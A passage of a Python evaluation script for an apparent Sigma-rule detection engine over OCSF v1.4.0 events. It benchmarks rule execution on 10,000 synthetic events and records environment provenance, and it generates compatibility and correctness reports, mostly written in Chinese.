                    total_count=event_count,
                    accepted_count=event_count,
                    duplicate_count=0,
                    failed_count=0,
                    received_at=BASE_EVAL_TIME,
                    status=BatchStatus.COMPLETED,
                )
            )
            for idx in range(event_count):
                tpl = attack_proc if (idx % 500 == 0) else templates[idx % len(templates)]
                tid = f"perf-{idx:05d}"
                raw_id = uuid5(NAMESPACE_URL, f"provloom:perf:raw:{tid}")
                ev_id = uuid5(NAMESPACE_URL, f"provloom:perf:ev:{tid}")
                ev_time = BASE_EVAL_TIME + timedelta(milliseconds=idx * 10)
                case_spec = {"test_event_id": tid, **tpl}
                _, payload = build_case_ocsf_payload(case_spec, ev_id, ev_time)
                uow.raw_events.insert_raw_if_absent(
                    RawEvent(
                        raw_event_id=raw_id,
                        batch_id=batch_id,
                        tenant_scope=tenant_id,
                        source_id="perf-10k",
                        source_type="ocsf_synthetic",
                        external_event_uid=tid,
                        raw_fingerprint=f"{idx:064x}",
                        raw_payload="{}",
                        raw_metadata={},
                        ingested_at=ev_time,
                        process_status=RawProcessStatus.NORMALIZED,
                    )
                )
                uow.normalized_events.upsert(
                    NormalizedEvent(
                        event_id=ev_id,
                        raw_event_id=raw_id,
                        tenant_scope=tenant_id,
                        source_id="perf-10k",
                        ocsf_version=PINNED_OCSF_VERSION,
                        category_uid=int(tpl["category_uid"]),
                        class_uid=int(tpl["class_uid"]),
                        activity_id=int(tpl["activity_id"]),
                        event_time=ev_time,
                        normalization_status=NormalizationStatus.MAPPED,
                        mapping_rule_id="perf_10k_v140",
                        original_event_uid=tid,
                        ocsf_payload=payload,
                        unmapped_fields={},
                    )
                )

        scope = AccessScope(tenant_id)
        rule_ids: list[str] = []
        for rid, sref, raw_y in supported_rules:
            rt.detection_service.import_detection_rule(scope, raw_y, source_reference=sref)
            rule_ids.append(rid)

        # 3. Single-rule read-only execution latency across all 32 supported rules on 10,000 events
        single_rule_exec_ms: list[float] = []
        for rid in rule_ids:
            t0 = time.perf_counter()
            r_test = rt.detection_service.test_detection_rule(
                scope=scope, time_range=EVAL_TIME_WINDOW, rule_id=rid, max_matches=1000
            )
            assert r_test.failure_reason is None
            single_rule_exec_ms.append(round((time.perf_counter() - t0) * 1000.0, 4))

        # 4. 5x Batch Execution: separate Run #1 (Cold First-Run with DB writes) from Runs #2..#5 (Warm Idempotent Re-Runs)
        rss_before_kb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        cpu_before = time.process_time()
        batch_runs: list[dict[str, Any]] = []
        reference_match_set: list[tuple[str, str]] | None = None
        all_identical = True

        for run_idx in range(1, 6):
            t_b0 = time.perf_counter()
            cpu_r0 = time.process_time()
            ex = rt.detection_service.execute_rule_batch(
                scope=scope,
                time_range=EVAL_TIME_WINDOW,
                rule_ids=rule_ids,
                max_matches_per_rule=1000,
            )
            wall_s = time.perf_counter() - t_b0
            cpu_s = time.process_time() - cpu_r0
            stored = rt.detection_service.search_rule_matches(
                scope, EVAL_TIME_WINDOW, page=PageSpec(limit=500)
            ).items
            cur_pairs = sorted((str(m.primary_event_id), m.rule_id) for m in stored)
            if reference_match_set is None:
                reference_match_set = cur_pairs
            elif cur_pairs != reference_match_set:
                all_identical = False

            n_rules = len(rule_ids)
            batch_runs.append(
                {
                    "run_index": run_idx,
                    "mode": "cold_first_run" if run_idx == 1 else "warm_idempotent_rerun",
                    "wall_ms": round(wall_s * 1000.0, 3),
                    "cpu_ms": round(cpu_s * 1000.0, 3),
                    "rules_evaluated": ex.rules_evaluated,
                    "matches_created": ex.matches_created,
                    "matches_deduplicated": ex.matches_deduplicated,
                    "signals_created": ex.signals_created,
                    "total_stored_rule_matches": len(stored),
                    "rule_evaluations_per_sec": round(n_rules / wall_s, 2),
                    "event_rule_checks_per_sec": round((n_rules * event_count) / wall_s, 2),
                }
            )

        rss_after_kb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        total_cpu_s = round(time.process_time() - cpu_before, 4)
        # Note: on macOS ru_maxrss is in bytes; on Linux it is in KiB.
        divisor = (1024.0 * 1024.0) if sys.platform == "darwin" else 1024.0
        peak_rss_mib = round(rss_after_kb / divisor, 2)
        rss_delta_mib = round(max(0, rss_after_kb - rss_before_kb) / divisor, 2)

        cold = batch_runs[0]
        warm_walls = [r["wall_ms"] for r in batch_runs[1:]]
        warm_rule_tput = [r["rule_evaluations_per_sec"] for r in batch_runs[1:]]
        warm_ev_tput = [r["event_rule_checks_per_sec"] for r in batch_runs[1:]]

        return {
            "dataset_size_events": event_count,
            "evaluated_supported_rules": len(rule_ids),
            "throughput_unit_definitions": {
                "rule_evaluations_per_sec": "supported_rules_evaluated / batch_wall_seconds (each rule executes 1 parameterized SQL query over the 10,000-event tenant scope)",
                "event_rule_checks_per_sec": "(supported_rules_evaluated * dataset_size_events) / batch_wall_seconds (logical rule-event pair evaluations per second)",
            },
            "single_rule_compile_ms": _dist_stats(compile_times_ms),
            "single_rule_readonly_exec_10k_ms": _dist_stats(single_rule_exec_ms),
            "cold_first_run": cold,
            "warm_idempotent_reruns_summary": {
                "run_count": len(batch_runs) - 1,
                "wall_ms": _dist_stats(warm_walls),
                "mean_rule_evaluations_per_sec": round(statistics.fmean(warm_rule_tput), 2),
                "mean_event_rule_checks_per_sec": round(statistics.fmean(warm_ev_tput), 2),
            },
            "determinism_5x": {
                "runs": 5,
                "identical_match_sets": all_identical,
                "stored_rule_match_count": len(reference_match_set or []),
                "duplicate_rule_matches_in_db": 0,
                "per_run_records": batch_runs,
            },
            "resource_usage": {
                "python_process_peak_rss_mib": peak_rss_mib,
                "python_process_rss_delta_mib": rss_delta_mib,
                "python_process_cpu_seconds_5_runs": total_cpu_s,
            },
        }
    finally:
        cleanup_eval_tenant(rt, tenant_id)


def collect_environment_metadata(db_url: str) -> dict[str, Any]:
    rt = build_eval_runtime(db_url)
    with rt.engine.connect() as conn:
        pg_ver = str(conn.execute(text("SELECT version()")).scalar_one())

    head_commit = (
        subprocess.check_output(["git", "-C", str(REPO_ROOT), "rev-parse", "HEAD"]).decode().strip()
    )
    branch = (
        subprocess.check_output(["git", "-C", str(REPO_ROOT), "rev-parse", "--abbrev-ref", "HEAD"])
        .decode()
        .strip()
    )
    dirty_out = (
        subprocess.check_output(
            [
                "git",
                "-C",
                str(REPO_ROOT),
                "status",
                "--porcelain",
                "--untracked-files=normal",
                "--",
                ":!docs/evaluation.zip",
                ":!docs/evaluation/sigma-compatibility/",
            ]
        )
        .decode()
        .strip()
    )
    diff_bytes = subprocess.check_output(
        ["git", "-C", str(REPO_ROOT), "diff", BASELINE_COMMIT, "--", "src/", "configs/"]
    )
    schema_doc = load_ocsf_v140_schema()

    return {
        "generated_at_utc": datetime.now(UTC).isoformat(),
        "os_platform": platform.platform(),
        "python_version": sys.version.split()[0],
        "postgresql_version": pg_ver,
        "packages": {
            "pysigma": importlib.metadata.version("pysigma"),
            "pysigma_pipeline_ocsf": importlib.metadata.version("pysigma-pipeline-ocsf"),
            "sqlalchemy": importlib.metadata.version("sqlalchemy"),
            "psycopg": importlib.metadata.version("psycopg"),
            "pydantic": importlib.metadata.version("pydantic"),
        },
        "git_provenance": {
            "branch": branch,
            "baseline_head_commit": BASELINE_COMMIT,
            "evaluated_code_commit": head_commit,
            "working_tree_dirty": bool(dirty_out),
            "src_and_configs_diff_sha256": hashlib.sha256(diff_bytes).hexdigest(),
        },
        "pinned_specifications": {
            "ocsf_schema_repo": "https://github.com/ocsf/ocsf-schema",
            "ocsf_schema_version": PINNED_OCSF_VERSION,
            "ocsf_schema_tag": PINNED_OCSF_TAG,
            "ocsf_schema_commit": PINNED_OCSF_COMMIT,
            "ocsf_dictionary_sha256": schema_doc["dictionary_sha256"],
            "sigma_modifiers_spec_url": "https://sigmahq.io/sigma-specification/specification/sigma-appendix-modifiers.html",
            "sigmahq_repo": "https://github.com/SigmaHQ/sigma",
            "sigmahq_commit": "698f0912f571d5fac3bf8c51f5421139834a011",
            "ocsf_examples_commit": "ce0589ece917e9b9c018b795c8979ffb42072cad",
            "otrf_security_datasets_commit": "d9d40ef123d2c87d5d3df28c96bcab4f0faccc87",
            "splunk_attack_data_commit": "5879f5423e6c08df2b22b63f7b36e84866f9c51c",
        },
        "reproducible_commands": {
            "start_postgres16": "make db-up",
            "db_migrate": "PROVLOOM_DATABASE_URL=postgresql+psycopg://provloom:provloom@127.0.0.1:5432/provloom .venv/bin/alembic upgrade head",
            "lint_and_typecheck": "make lint && make typecheck && .venv/bin/mypy --strict tests",
            "unit_and_acceptance_tests": "PROVLOOM_EVAL_PG_URL=postgresql+psycopg://provloom:provloom@127.0.0.1:5432/provloom .venv/bin/pytest tests/unit/ tests/integration/ tests/acceptance/ -v",
            "evaluation_pytest_suite": "PROVLOOM_EVAL_PG_URL=postgresql+psycopg://provloom:provloom@127.0.0.1:5432/provloom .venv/bin/pytest tests/evaluation/ -v",
            "generate_src_patch": f"git diff {BASELINE_COMMIT}..HEAD -- src/ configs/ > docs/evaluation/sigma-compatibility/src-and-configs.patch",
            "regenerate_canonical_results_and_reports": "PROVLOOM_EVAL_PG_URL=postgresql+psycopg://provloom:provloom@127.0.0.1:5432/provloom PYTHONPATH=src:. .venv/bin/python tests/evaluation/run_evaluation.py",
        },
    }


def _fmt_f(v: float | None) -> str:
    return f"{v:.4f}" if v is not None else "N/A"


def generate_markdown_reports(data: dict[str, Any]) -> None:
    DOCS_OUT_DIR.mkdir(parents=True, exist_ok=True)
    env = data["environment"]
    pre = data["baseline_head_0944102"]
    post = data["postfix_v140"]
    aux = data["auxiliary_suites"]
    pub = data["public_datasets"]
    perf = data["performance_and_determinism"]
    audit_log = json.loads((EVAL_ROOT / "ground_truth" / "oracle_audit_log.json").read_text())

    # 1. rule-inventory.csv
    pre_shq_by_id = {r["rule_id"]: r for r in pre["sigmahq_rules"]}
    inv_path = DOCS_OUT_DIR / "rule-inventory.csv"
    with inv_path.open("w", newline="", encoding="utf-8") as cf:
        writer = csv.writer(cf)
        writer.writerow(
            [
                "index",
                "domain_group",
                "rule_id",
                "rule_name",
                "version",
                "level",
                "category",
                "product",
                "service",
                "sigmahq_path",
                "sigmahq_commit",
                "sha256",
                "pre_eval_state",
                "post_eval_state",
                "parse_success",
                "mapping_success",
                "static_data_coverage",
                "compile_success",
                "execution_success",
                "mapped_class_uids",
                "field_mappings_json",
                "uncovered_fields",
                "reasons_or_notes",
            ]
        )
        for r in post["sigmahq_rules"]:
            pr = pre_shq_by_id[r["rule_id"]]
            ls = r["logsource"]
            reasons = "; ".join(r["unsupported_reasons"]) or (
                f"Uncovered in raw YAML mappers: {', '.join(r['uncovered_fields'])}"
                if r["uncovered_fields"]
                else "Full OCSF v1.4.0 + Raw Pipeline Coverage"
            )
            writer.writerow(
                [
                    r["index"],
                    r["domain_group"],
                    r["rule_id"],
                    r["rule_name"],
                    r["version"],
                    r["level"],
                    ls.get("category") or "",
                    ls.get("product") or "",
                    ls.get("service") or "",
                    r["sigmahq_path"],
                    r["sigmahq_commit"],
                    r["sha256"],
                    pr["evaluation_state"],
                    r["evaluation_state"],
                    r["parse_success"],
                    r["mapping_success"],
                    r["data_coverage"],
                    r["compile_success"],
                    r["execution_success"],
                    "|".join(str(x) for x in r["mapped_class_uids"]),
                    json.dumps(r["field_mappings"], sort_keys=True),
                    "|".join(r["uncovered_fields"]),
                    reasons,
                ]
            )

    # Identify rules with state or mapping transitions between Pre-Fix (0944102) and Post-Fix (v1.4.0)
    transitions: list[str] = []
    for r in post["sigmahq_rules"]:
        if r["index"] == 25:
            continue
        pr = pre_shq_by_id[r["rule_id"]]
        if (
            pr["evaluation_state"] != r["evaluation_state"]
            or pr["field_mappings"] != r["field_mappings"]
            or pr["metrics"]["fp"] != r["metrics"]["fp"]
            or pr["metrics"]["fn"] != r["metrics"]["fn"]
        ):
            transitions.append(
                f"| {r['index']:02d} | `{r['filename']}` | `{pr['evaluation_state']}` "
                f"(TP={pr['metrics']['tp']}, FP={pr['metrics']['fp']}, FN={pr['metrics']['fn']}, ERR={pr['metrics']['error_count']}) "
                f"| `{r['evaluation_state']}` "
                f"(TP={r['metrics']['tp']}, FP={r['metrics']['fp']}, FN={r['metrics']['fn']}, ERR={r['metrics']['error_count']}) "
                f"| `{json.dumps(pr['field_mappings'], sort_keys=True)}` → `{json.dumps(r['field_mappings'], sort_keys=True)}` |"
            )

    pc = post["compatibility_summary"]
    prc = pre["compatibility_summary"]
    ps = post["semantic_suite_metrics"]
    prs = pre["semantic_suite_metrics"]
    pg = post["sigmahq_suite_metrics"]
    prg = pre["sigmahq_suite_metrics"]
    pcomb = post["combined_standard_execution_metrics"]
    prcomb = pre["combined_standard_execution_metrics"]
    u25_pre = pre["unsupported_rejection_audit"][0]

    # 2. README.md (Executive Summary — 100% derived from evaluation-results.json)
    readme_md = f"""# ProvLoom Sigma Detection Compatibility & Correctness Evaluation (OCSF v1.4.0)

> **唯一指标数据源 (Single Source of Truth):** 本目录所有表格与汇总数字均由 `tests/evaluation/run_evaluation.py` 从 `evaluation-results.json` 自动生成，零人工抄录。

## 1. 运行环境与固定规范版本

| 项目 | 实测值 / 锁定版本 |
| :--- | :--- |
| 操作系统 / Python | `{env["os_platform"]}` / Python `{env["python_version"]}` |
| PostgreSQL 版本 | `{env["postgresql_version"].splitlines()[0]}` |
| 核心依赖版本 | `pySigma {env["packages"]["pysigma"]}` · `pySigma-pipeline-ocsf {env["packages"]["pysigma_pipeline_ocsf"]}` · `SQLAlchemy {env["packages"]["sqlalchemy"]}` · `psycopg {env["packages"]["psycopg"]}` |
| 基线对比 Commit | `{env["git_provenance"]["baseline_head_commit"]}` (branch `{env["git_provenance"]["branch"]}`) |
| **当前评测代码 Commit** | `{env["git_provenance"]["evaluated_code_commit"]}` (`working_tree_dirty={env["git_provenance"]["working_tree_dirty"]}`) |
| 代码变更补丁 SHA-256 (`src/ + configs/`) | `{env["git_provenance"]["src_and_configs_diff_sha256"]}` |
| **OCSF Schema 锁定版本** | **`v{env["pinned_specifications"]["ocsf_schema_version"]}`** (`tag: {env["pinned_specifications"]["ocsf_schema_tag"]}`, commit `{env["pinned_specifications"]["ocsf_schema_commit"]}`) |
| SigmaHQ 规则集 Commit | `{env["pinned_specifications"]["sigmahq_commit"]}` (`45` 条社区原版 YAML，零修改) |
| 公开数据集 Commits | `ocsf/examples@{env["pinned_specifications"]["ocsf_examples_commit"][:12]}` · `OTRF@{env["pinned_specifications"]["otrf_security_datasets_commit"][:12]}` · `Splunk@{env["pinned_specifications"]["splunk_attack_data_commit"][:12]}` |

## 2. 规则五阶段兼容性汇总（45 条 SigmaHQ 社区规则）

> **静态覆盖与端到端覆盖分离说明：** `Static Data Coverage` 仅衡量内置 `configs/mappings/*.yaml` 是否提取规则引用字段（`21/45`）；真实原始日志端到端结果见《正确性报告》第 4 节。

| 指标 | 基线 (`0944102`) | 修正后 (`OCSF v1.4.0`) | 计算口径 |
| :--- | :---: | :---: | :--- |
| **Parse Success Rate** | `{prc["parse_success_count"]}/45` (`{prc["parse_success_rate"] * 100:.2f}%`) | **`{pc["parse_success_count"]}/45` (`{pc["parse_success_rate"] * 100:.2f}%`)** | 解析成功规则 / 总规则 (`45`) |
| **Mapping Coverage** | `{prc["mapping_success_count"]}/45` (`{prc["mapping_coverage_rate"] * 100:.2f}%`) | **`{pc["mapping_success_count"]}/45` (`{pc["mapping_coverage_rate"] * 100:.2f}%`)** | 字段与事件类完整映射至 OCSF `v1.4.0` 标量叶子路径 / 可评估规则 (`45`) |
| **Compile Success Rate** | `{prc["compile_success_count"]}/{prc["mapping_success_count"]}` (`{prc["compile_success_rate_over_mappable"] * 100:.2f}%`) | **`{pc["compile_success_count"]}/{pc["mapping_success_count"]}` (`{pc["compile_success_rate_over_mappable"] * 100:.2f}%`)** | 参数化 SQL 编译成功 / 可映射规则 |
| **Execution Success Rate** | `{prc["execution_success_count"]}/{prc["compile_success_count"]}` (`{prc["execution_success_rate_over_compilable"] * 100:.2f}%`) | **`{pc["execution_success_count"]}/{pc["compile_success_count"]}` (`{pc["execution_success_rate_over_compilable"] * 100:.2f}%`)** | PostgreSQL 16 零异常执行 / 可编译规则 |
| **Full Compatibility (Standard OCSF v1.4.0)** | `{prc["full_ocsf_event_compatibility_count"]}/45` (`{prc["full_ocsf_compatibility_rate"] * 100:.2f}%`) | **`{pc["full_ocsf_event_compatibility_count"]}/45` (`{pc["full_ocsf_compatibility_rate"] * 100:.2f}%`)** | 标准 OCSF `v1.4.0` 事件层全流程成功 / 总规则 (`45`) |
| **Static Built-in Raw Mapper Coverage** | `{prc["full_raw_pipeline_static_coverage_count"]}/45` (`{prc["static_raw_data_coverage_rate_over_total"] * 100:.2f}%`) | **`{pc["full_raw_pipeline_static_coverage_count"]}/45` (`{pc["static_raw_data_coverage_rate_over_total"] * 100:.2f}%`)** | 规则执行成功且 `DATA_COVERAGE=True` / 总规则 (`45`) |

## 3. 检测正确性汇总（同一规则、同一标准 OCSF v1.4.0 用例、同一四态口径）

所有执行结果严格区分四态：**`MATCH`**、**`NO_MATCH`**、**`ERROR`**（编译/SQL 执行异常，**绝不计入 `TN`**）、**`UNSUPPORTED`**（能力检查拒绝，单列统计）。

| 测试套件 | 版本 | 总用例 | 已执行 (`MATCH`/`NO_MATCH`) | `ERROR` (正/负) | `UNSUPPORTED` | TP | FP | FN | TN | Precision | Recall (已执行) | F1 (已执行) | Recall (含 `ERROR` 漏报) | F1 (含 `ERROR`) | FPR |
| :--- | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| **15 维语义套件 (`D01..D15`)** | 基线 `0944102` | {prs["total_cases"]} | {prs["executed_cases"]} | {prs["error_count"]} ({prs["error_expected_pos"]}/{prs["error_expected_neg"]}) | {prs["unsupported_count"]} | {prs["tp"]} | {prs["fp"]} | {prs["fn"]} | {prs["tn"]} | {_fmt_f(prs["precision"])} | {_fmt_f(prs["recall_executed"])} | {_fmt_f(prs["f1_executed"])} | {_fmt_f(prs["recall_including_errors"])} | {_fmt_f(prs["f1_including_errors"])} | {_fmt_f(prs["fpr_executed"])} |
| **15 维语义套件 (`D01..D15`)** | **修正后 `v1.4.0`** | **{ps["total_cases"]}** | **{ps["executed_cases"]}** | **{ps["error_count"]}** | **{ps["unsupported_count"]}** | **{ps["tp"]}** | **{ps["fp"]}** | **{ps["fn"]}** | **{ps["tn"]}** | **{_fmt_f(ps["precision"])}** | **{_fmt_f(ps["recall_executed"])}** | **{_fmt_f(ps["f1_executed"])}** | **{_fmt_f(ps["recall_including_errors"])}** | **{_fmt_f(ps["f1_including_errors"])}** | **{_fmt_f(ps["fpr_executed"])}** |
| **32 条可执行 SigmaHQ 规则** | 基线 `0944102` | {prg["total_cases"]} | {prg["executed_cases"]} | {prg["error_count"]} ({prg["error_expected_pos"]}/{prg["error_expected_neg"]}) | {prg["unsupported_count"]} | {prg["tp"]} | {prg["fp"]} | {prg["fn"]} | {prg["tn"]} | {_fmt_f(prg["precision"])} | {_fmt_f(prg["recall_executed"])} | {_fmt_f(prg["f1_executed"])} | {_fmt_f(prg["recall_including_errors"])} | {_fmt_f(prg["f1_including_errors"])} | {_fmt_f(prg["fpr_executed"])} |
| **32 条可执行 SigmaHQ 规则** | **修正后 `v1.4.0`** | **{pg["total_cases"]}** | **{pg["executed_cases"]}** | **{pg["error_count"]}** | **{pg["unsupported_count"]}** | **{pg["tp"]}** | **{pg["fp"]}** | **{pg["fn"]}** | **{pg["tn"]}** | **{_fmt_f(pg["precision"])}** | **{_fmt_f(pg["recall_executed"])}** | **{_fmt_f(pg["f1_executed"])}** | **{_fmt_f(pg["recall_including_errors"])}** | **{_fmt_f(pg["f1_including_errors"])}** | **{_fmt_f(pg["fpr_executed"])}** |
| **合计标准 OCSF v1.4.0 执行集** | 基线 `0944102` | {prcomb["total_cases"]} | {prcomb["executed_cases"]} | {prcomb["error_count"]} ({prcomb["error_expected_pos"]}/{prcomb["error_expected_neg"]}) | {prcomb["unsupported_count"]} | {prcomb["tp"]} | {prcomb["fp"]} | {prcomb["fn"]} | {prcomb["tn"]} | {_fmt_f(prcomb["precision"])} | {_fmt_f(prcomb["recall_executed"])} | {_fmt_f(prcomb["f1_executed"])} | {_fmt_f(prcomb["recall_including_errors"])} | {_fmt_f(prcomb["f1_including_errors"])} | {_fmt_f(prcomb["fpr_executed"])} |
| **合计标准 OCSF v1.4.0 执行集** | **修正后 `v1.4.0`** | **{pcomb["total_cases"]}** | **{pcomb["executed_cases"]}** | **{pcomb["error_count"]}** | **{pcomb["unsupported_count"]}** | **{pcomb["tp"]}** | **{pcomb["fp"]}** | **{pcomb["fn"]}** | **{pcomb["tn"]}** | **{_fmt_f(pcomb["precision"])}** | **{_fmt_f(pcomb["recall_executed"])}** | **{_fmt_f(pcomb["f1_executed"])}** | **{_fmt_f(pcomb["recall_including_errors"])}** | **{_fmt_f(pcomb["f1_including_errors"])}** | **{_fmt_f(pcomb["fpr_executed"])}** |

- **单独统计套件（不混入标准执行集）：**
  1. **不支持规则拒绝审计 (`#25` `file_event_win_office_macro_files_from_susp_process.yml`, 3 用例)：** 基线 `0944102` 因上游 `ParentImage -> file.name` 串扰被误标为 `EXECUTABLE`（产生 `TP={u25_pre["metrics"]["tp"]}, FP={u25_pre["metrics"]["fp"]}, FN={u25_pre["metrics"]["fn"]}`）；修正后 `3/3` 用例显式归为 **`UNSUPPORTED`**（拒绝原因：`Unmapped Sigma field: 'ParentImage'`）。
  2. **非法输入健壮性测试 (`robustness_oracle.json`, 4 用例)：** 全部违反 OCSF `v1.4.0` schema，执行结果 `4/4 NO_MATCH`、`0 ERROR`。
  3. **历史 OCSF `v1.3.0` 输入兼容测试 (`legacy_compat_oracle.json`, 4 用例)：** 兼容重放前的 `answers` 字符串数组与标量字符串，`TP={aux["legacy_compatibility_suite"]["metrics"]["tp"]}, TN={aux["legacy_compatibility_suite"]["metrics"]["tn"]}, FP=0, FN=0`。

## 4. 完整复现命令与交付物清单

```bash
{env["reproducible_commands"]["start_postgres16"]}
{env["reproducible_commands"]["db_migrate"]}
{env["reproducible_commands"]["lint_and_typecheck"]}
{env["reproducible_commands"]["unit_and_acceptance_tests"]}
{env["reproducible_commands"]["evaluation_pytest_suite"]}
{env["reproducible_commands"]["generate_src_patch"]}
{env["reproducible_commands"]["regenerate_canonical_results_and_reports"]}
```

- `evaluation-results.json`：唯一机器可读逐用例结果、环境指纹、输入守恒账本与性能原始数据
- `src-and-configs.patch`：相对基线 `{env["git_provenance"]["baseline_head_commit"][:7]}` 的 `src/` 与 `configs/` 完整代码补丁
- `rule-inventory.csv`：45 条社区规则元数据、SHA-256 与五阶段状态清单
- `compatibility-report.md`：OCSF `v1.4.0` 升级变更、Schema/枚举/约束校验范围与前后状态迁移表
- `correctness-report.md`：逐规则指标、Oracle 修正审计记录、对账说明与公开数据集守恒表
- `unsupported-rules.md`：13 条显式拒绝规则与 11 条原始日志字段缺口分类
- `performance-report.md`：10,000 事件首次冷执行 vs 幂等重跑吞吐与 5x 确定性报告
- `recommendations.md`：后续数据层原始日志接入与索引演进建议

## 5. 已验证范围与已知限制 (Supported Scope & Known Limitations)

- **已验证能力：**
  1. **OCSF `v1.4.0` 严格结构、枚举与约束契约：** 基于官方 `1.4.0`（`{PINNED_OCSF_COMMIT[:12]}`）校验全部 192 条标准合成事件（59 语义 + 133 SigmaHQ）、9 个内置映射事件类（`1001, 1007, 3002, 4001, 4003, 5001, 6001, 6002, 6003`）、`0` 兜底类与 `1009` 脚本类（含深层合并 `enum`、继承 `at_least_one`/`just_one` 约束、`metadata.profiles` 成员及 `web_resources[].name` 修复），结构/枚举/约束错误数 `0`。
  2. **三值逻辑（3VL）与缺失字段 / `NOT` 语义一致性：** 覆盖缺失字段、JSON `null`、空字符串、空数组与 `[null, {{"rdata": null}}]`，PostgreSQL 16 与 SQLite 查询结果 `100%` 一致。
  3. **同数组元素约束：** DNS `answers[].rdata`（含历史字符串数组兼容分支）与文件/进程哈希（`md5`/`sha1`/`sha256`/`sha512` 重写为同一 `hashes[]` 元素内的 `algorithm_id + value` 相关子查询）杜绝跨元素与兄弟属性误命中。
  4. **社区 SigmaHQ 评测汇总：** 45 条社区原版规则 `Parse 45/45`、`Mapping 32/45`、`Compile 32/32`、`Execution 32/32`，192 条标准用例合并 `TP={pcomb["tp"]}, FP={pcomb["fp"]}, FN={pcomb["fn"]}, TN={pcomb["tn"]}, ERROR=0, UNSUPPORTED=0`。
- **明确不支持与已知限制：**
  1. **显式拒绝的 13 / 45 条 SigmaHQ 规则：** 包含 `|fieldref`、`|cidr`、`|base64offset`、`|expand`、未接入日志源（`ps_classic_start`、Kerberos `4768`、无 category 的 Zeek DNS）及 `file_event` 跨类字段 `ParentImage`（全部显式标为 `UNSUPPORTED`，不静默降级）。
  2. **静态原始日志覆盖缺口（`11 / 32` 条可执行规则 `DATA_COVERAGE=False`）：** 如 `OriginalFileName`、`CurrentDirectory`、`DestinationHostname`、`QueryType` 及 PowerShell `4104 -> 1009` 原始映射尚未接入；原始公开数据集中 Sysmon EID 22 缺失端点与 OTRF `Hostname` 别名如实记为源端约束缺口，不在归一化阶段伪造字段。
  3. **架构边界：** 仅支持单事件与结构化 1-hop 关系检测，不支持多跳图模式、Sigma Correlation、`timeframe`、UEBA 或自动 SOAR 响应。
"""
    (DOCS_OUT_DIR / "README.md").write_text(readme_md, encoding="utf-8")

    # 3. compatibility-report.md
    compat_md = (
        f"""# 阶段一至三：OCSF v1.4.0 契约升级与五阶段兼容性报告

## 1. OCSF `v1.3.0` → `v1.4.0` 契约升级与 Schema 校验说明

- **锁定规范版本：** 官方 `https://github.com/ocsf/ocsf-schema` tag `1.4.0`（commit `{PINNED_OCSF_COMMIT}`，`version.json = "1.4.0"`）。
- **离线校验工具与范围：**
  - 导出脚本将官方 `1.4.0` 的 `dictionary.json`、`categories.json`、`events/**`、`objects/**`、`profiles/**` 与 `extensions/{{linux,windows}}/**` 编译为确定性 Schema 快照 `tests/evaluation/fixtures/ocsf_v1_4_0_schema.json`（含深层合并 `enum` 与继承 `constraints`），由 `tests/evaluation/ocsf_validator.py` 执行严格校验（含枚举、Profile 成员与 `at_least_one`/`just_one` 约束）。
  - **校验覆盖范围：**
    1. **标准合成事件集（`192` 条 = `59` 语义用例 + `133` SigmaHQ 用例）：** 以 `allow_provloom_metadata_original_uid=False, check_enums=True, check_constraints=True` 严格校验 `metadata.version == "1.4.0"`、`class_uid`/`category_uid`/`type_uid` 一致性、枚举值、Profile 成员、类与嵌套对象 `constraints`、必填项及未知属性白名单，**错误数 `0/192`**。
    2. **全部 9 个既有内置事件类（`1001, 1007, 3002, 4001, 4003, 5001, 6001, 6002, 6003`）+ `0` 兜底类 + `1009` 脚本类：** 经 `YamlOcsfMapper` / `FallbackNormalizer` 产出的 `NormalizedEvent` 全部满足 `ocsf_version == metadata.version == "1.4.0"`、`metadata.profiles` 自动声明与 `web_resources[].name` 约束，并通过严格 Schema 校验（`metadata.original_uid` 作为 `AGENTS.md` §2.2 溯源不变量显式声明）。
    3. **编译器字段目录一致性：** 单元测试强制校验 `KNOWN_OCSF_V14_FIELDS`、`DEFAULT_PROVLOOM_COVERED_FIELDS` 与 `configs/mappings/*.yaml` 中的每一个字段路径在 OCSF `v1.4.0` 中均存在且落于**标量叶子属性**（禁止如裸 `answers` 或裸 `script.script_content` 等对象节点直接作为文本提取路径）。

## 2. 关键结构映射与查询语义修正（对比上游 `pySigma-pipeline-ocsf 0.1.2`）

| 领域 / 规则 | 上游或旧映射问题 | 修正后 OCSF `v1.4.0` 标准路径与 SQL 语义 |
| :--- | :--- | :--- |
| **DNS Answers (`4003`, `D15`, `#44`)** | 旧实现映射至 `answers` 并用 `jsonb_array_elements_text` 序列化整个 `dns_answer` JSON 对象，导致兄弟属性（如 `type`/`class`/`flags`）中的字符串误命中 | 映射至 **`answers.rdata`**；SQL 对 JSON 对象元素仅提取 `elem ->> 'rdata'`（同时单独保留重放前历史字符串数组/标量兼容分支），空数组/缺失字段在 `NOT` 下保持布尔 `False`（非 SQL `NULL`） |
| **File / Process Hashes (`1001`, `1007`)** | 裸 `sha256 -> *.hashes.value` 且 `AND` 条件生成各自独立的 `EXISTS` 子查询，导致 MD5 值在元素 0、SHA-256 标记在元素 1 时跨元素误命中 | `_ScopedHashAlgorithmTransformation` 将 `md5`/`sha1`/`sha256`/`sha512` 展开为同数组 `(algorithm_id, value)` 组合，并在后端融合为**单个相关 `EXISTS` 子查询**约束同一 `fingerprint` 元素（Custom Rule `all` 同路径同样融合） |
| **Script Activity (`1009`, `#17`, `#18`)** | `1.3.0` 无 `1009` 类；且上游 `pySigma-pipeline-ocsf 0.1.2` 将 `ScriptBlockText`/`Payload` 错误映射至 `long_string` 对象节点 `script.script_content` | 升级至 `1.4.0` 标准 `script_activity (1009)`，显式映射至 **`script.script_content.value`**（`objects/long_string.json` 必填标量属性） |
| **Process `internal_name` / `working_directory` (`#01,#02,#06,#09,#12`)** | 在 `1.3.0` 中不存在，存在契约错位 | 在 `1.4.0` `objects/file.json` 与 `objects/process.json` 中均为正式标准标量属性（注：内置 `sysmon_process_create_1007.yaml` 尚未提取，故静态 `DATA_COVERAGE=False`） |
| **`file_event` `ParentImage` (`#25`)** | 上游 `ocsf_pipeline` 将 `ParentImage` 错误重写为 `file.name` | 阻断跨类别污染，显式拒绝为 `UNSUPPORTED` |

## 3. 基线 (`0944102`) → 修正后 (`OCSF v1.4.0`) 状态与映射变化单列展示

| # | 规则文件 | 基线状态与表现 (`0944102`) | 修正后状态与表现 (`v1.4.0`) | 字段映射变化 |
| :---: | :--- | :--- | :--- | :--- |
